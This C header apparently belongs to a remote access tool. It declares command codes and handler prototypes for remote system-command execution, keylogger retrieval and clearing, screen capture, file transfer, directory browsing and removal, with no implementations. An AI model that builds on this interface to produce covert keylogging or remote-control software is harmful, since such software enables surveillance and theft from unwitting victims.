#ifndef __COMMANDS_H
#define __COMMANDS_H

#define COMMANDS_APPROVE '+'
#define COMMANDS_DISAPPROVE '-'

#define COMMANDS_SEND 1
#define COMMANDS_INFO 2
#define COMMANDS_TERMINATE 3
#define COMMANDS_SYSTEM 4
#define COMMANDS_KEYLOGGER_GET 5
#define COMMANDS_KEYLOGGER_SIZE 6
#define COMMANDS_KEYLOGGER_CLEAR 7
#define COMMANDS_SCREEN_GET 8
#define COMMANDS_GET_FILE 9
#define COMMANDS_SEND_FILE 10
#define COMMANDS_SCREEN_CAPTURE 11
#define COMMANDS_HDD_LS_ARG 12 //is not used using COMMANDS_HDD_LS
#define COMMANDS_HDD_LS 13 //ls on current path
#define COMMANDS_HDD_CD 14
#define COMMANDS_REMOVE 15
#define COMMANDS_DISK_LIST 16
#define COMMANDS_SCREEN_IS_USING_COMPRESSOR 17

#define COMMANDS_SUCC 1
#define COMMANDS_UNKNOW_COMMAND -9

extern int commands_Translate(unsigned char* msg);
extern int command_Send(unsigned char* msg);
extern int command_Info(void);
extern int command_System(unsigned char* msg);
extern int command_Keylogger_Get(void);
extern int command_Keylogger_Size(void);
extern int command_Keylogger_Clear(void);
extern int command_Screen_Get(unsigned char* msg);
extern int command_Get_File(unsigned char* msg);
extern int command_Send_File(unsigned char* msg);
extern int command_Screen_Capture(unsigned char* msg);
extern int command_hdd_Ls(unsigned char* msg);
extern int command_hdd_Cd(unsigned char* msg);
extern int command_Remove(unsigned char* msg);
extern int command_Desk_list(void);
extern int command_Screen_IsUsingCompressor(unsigned char* msg);

#endif